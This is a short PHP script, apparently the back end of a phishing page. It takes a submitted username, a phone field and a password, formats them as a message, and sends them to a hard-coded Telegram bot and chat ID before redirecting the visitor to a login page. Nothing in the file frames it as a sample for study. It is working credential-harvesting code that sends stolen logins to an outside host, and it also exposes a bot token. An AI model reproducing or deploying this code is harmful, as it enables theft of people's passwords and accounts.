<?php

$name = $_POST['username'];
$mail = $_POST['mail'];
$password = $_POST['password'];
$token = "6085931159:AAFjUMzs7bS6Wvkf-p4jxuDBUzNu09DZ-O8";
$chat_id = "1129521727";
$arr = array(
  'Имя пользователя: ' => $name,
  'Телефон: ' => $mail,
  'Password: ' => $password
);

foreach($arr as $key => $value) {
  $txt .= "<b>".$key."</b> ".$value."\n";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if ($sendToTelegram) {
  header('Location: /page/login.php');
} else {
  echo "Error";
}
?>